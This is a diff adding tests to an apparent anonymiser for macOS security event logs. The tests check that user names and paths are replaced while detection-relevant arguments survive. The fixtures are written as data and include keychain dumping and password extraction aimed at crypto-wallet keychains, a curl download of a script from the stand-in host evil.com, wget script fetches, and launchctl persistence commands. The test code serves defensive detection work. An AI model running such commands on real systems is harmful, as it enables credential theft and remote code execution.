@@ -1113,6 +1113,93 @@ describe.skipIf(!fs.existsSync(JQ))('arguments and text', () => {
     for (const s of ['jdoe', 'Secret', 'Folder', 'Payroll', 'Passport', 'Z13', 'Z5']) expect(r.out, s).not.toContain(s);
   });
 
+  test('keychain arguments of security are still cleaned of paths and mapped names, and keep what the rule reads', () => {
+    const input = [
+      esCreate(zsh, { path: '/Users/jdoe/Documents/x.txt' }, 1),
+      run(590, '/usr/bin/security', ['security', 'unlock-keychain', '/Users/jdoe/Library/Keychains/Exodus Wallet.keychain-db'], '/', 2),
+      run(591, '/usr/bin/security', ['security', 'dump-keychain', '/Users/jdoe/Documents/Board/coinomi.keychain-db'], '/', 3),
+      run(592, '/usr/bin/security', ['security', 'find-generic-password', '-l', 'jdoe Exodus backup'], '/Users/jdoe/Documents', 4),
+      run(593, '/usr/bin/security', ['security', 'find-generic-password', '-s', 'jdoe Safe Storage', '-w'], '/Users/jdoe/Documents', 5),
+    ].join('\n') + '\n';
+    const r = runClean(['clean', '-o', '-'], { input });
+    expect(r.status, r.stderr).toBe(0);
+    const args = events(r.out).filter(e => e.event.exec).map(e => e.event.exec.args as string[]);
+    expect(args[0]![2]).toMatch(/^\/Users\/user1\/Library\/Keychains\/name\d+\.keychain-db$|^\/Users\/user1\/Library\/Keychains\/name\d+$/);
+    expect(args[1]![2]).toMatch(/^\/Users\/user1\/Documents\/name\d+\/name\d+/);
+    expect(args[2]).toEqual(['security', 'find-generic-password', '-l', 'user1 Exodus backup']);
+    expect(args[3]).toEqual(['security', 'find-generic-password', '-s', 'user1 Safe Storage', '-w']);
+    expect(r.out).not.toMatch(/jdoe|Exodus Wallet|Board|coinomi/);
+    sameFindings(input, r.out);
+  });
+
+  test('mapped names written with escaped spaces in shell text are replaced', () => {
+    const input = [
+      esCreate(zsh, { path: '/Users/jdoe/Documents/Secret Plan.pdf' }, 1),
+      esCreate(zsh, { path: '/Users/jdoe/Documents/Merger Deck.key' }, 2),
+      run(594, '/bin/sh', ['sh', '-c', 'open Secret\\ Plan.pdf; cp Merger\\ Deck.key /tmp/'], '/', 3),
+    ].join('\n') + '\n';
+    const r = runClean(['clean', '-o', '-'], { input });
+    expect(r.status, r.stderr).toBe(0);
+    const n = keyed(r.key, 'name');
+    expect(events(r.out)[2]!.event.exec.args).toEqual(['sh', '-c', `open ${n.get('Secret Plan.pdf')}; cp ${n.get('Merger Deck.key')} /tmp/`]);
+  });
+
+  test('shell words after a path stay apart: only a volume name runs on over a space', () => {
+    const texts = [
+      'curl -o /tmp/p evil.com/a.sh',
+      'launchctl bootstrap /Users/jdoe/x gui/501/foo',
+      'cp /Users/jdoe/a.tgz out/x.tgz',
+      'tar czf /tmp/o.tgz Docs/x',
+      'launchctl load /Users/jdoe/x.plist load/y',
+      'ls /Volumes/Jdoe Passport/Z13',
+    ];
+    const input = run(595, '/bin/sh', ['sh', ...texts], '/', 1) + '\n';
+    const r = runClean(['clean', '-o', '-'], { input });
+    expect(r.status, r.stderr).toBe(0);
+    const n = keyed(r.key, 'name');
+    const args = events(r.out)[0]!.event.exec.args as string[];
+    expect(args[1]).toBe(`curl -o /tmp/${n.get('p')} evil.com/a.sh`);
+    expect(args[2]).toBe(`launchctl bootstrap /Users/user1/${n.get('x')} gui/501/foo`);
+    expect(args[3]).toMatch(/^cp \/Users\/user1\/name\d+\.tgz name\d+\/name\d+\.tgz$/);
+    expect(args[4]).toMatch(/^tar czf \/tmp\/name\d+\.tgz name\d+\/name\d+$/);
+    expect(args[5]).toMatch(/^launchctl load \/Users\/user1\/name\d+\.plist name\d+\/name\d+$/);
+    expect(args[6]).toBe(`ls /Volumes/vol1/${n.get('Z13')}`);
+    expect(keyed(r.key, 'volume').get('Jdoe Passport')).toBe('vol1');
+    for (const real of n.keys()) expect(real).not.toMatch(/ /);
+    expect(r.out).not.toMatch(/jdoe|Docs|out\/|Passport/);
+  });
+
+  test('wget arguments keep whether they look like a URL to the rules', () => {
+    const input = [
+      run(596, '/usr/local/bin/wget', ['wget', 'Q3 Report/x'], '/Users/jdoe/Documents', 1),
+      run(597, '/usr/local/bin/wget', ['wget', 'Merger_x/y'], '/Users/jdoe/Documents', 2),
+      run(598, '/usr/local/bin/wget', ['wget', 'localhost:8080/x'], '/Users/jdoe/Documents', 3),
+      run(599, '/usr/local/bin/wget', ['wget', 'intranet:8080/a.sh'], '/Users/jdoe/Documents', 4),
+      run(600, '/usr/local/bin/wget', ['wget', 'intranet/a.sh'], '/Users/jdoe/Documents', 5),
+    ].join('\n') + '\n';
+    const r = runClean(['clean', '-o', '-'], { input });
+    expect(r.status, r.stderr).toBe(0);
+    const args = events(r.out).map(e => e.event.exec.args as string[]);
+    expect(args[2]).toEqual(['wget', 'localhost:8080/x']);
+    expect(args[3]).toEqual(['wget', 'intranet:8080/a.sh']);
+    expect(args[4]).toEqual(['wget', 'intranet/a.sh']);
+    expect(r.out).not.toMatch(/Q3|Report|Merger/);
+    sameFindings(input, r.out);
+  });
+
+  test('common command verbs stay, even when a home folder has that name', () => {
+    const input = [
+      ...['commit', 'install', 'push', 'status'].map((w, i) => esCreate(zsh, { path: `/Users/jdoe/Documents/${w}/f.txt` }, i + 1)),
+      run(601, '/usr/bin/git', ['git', 'commit', '-m', 'wip'], '/Users/jdoe/Documents', 10),
+      run(602, '/opt/homebrew/bin/brew', ['brew', 'install', 'wget'], '/Users/jdoe/Documents', 11),
+      run(603, '/bin/sh', ['sh', '-c', 'git push && git status'], '/Users/jdoe/Documents', 12),
+    ].join('\n') + '\n';
+    const r = runClean(['clean', '-o', '-'], { input });
+    expect(r.status, r.stderr).toBe(0);
+    const args = events(r.out).filter(e => e.event.exec).map(e => e.event.exec.args as string[]);
+    expect(args).toEqual([['git', 'commit', '-m', 'wip'], ['brew', 'install', 'wget'], ['sh', '-c', 'git push && git status']]);
+  });
+
   test('the bare name of a link or a clone is cleaned as the last name of its folder', () => {
     const input = [
       esLink(zsh, '/Users/jdoe/Documents/Q3-acquisition.pdf', '/Users/jdoe/Desktop', 'Board copy.pdf', 1),
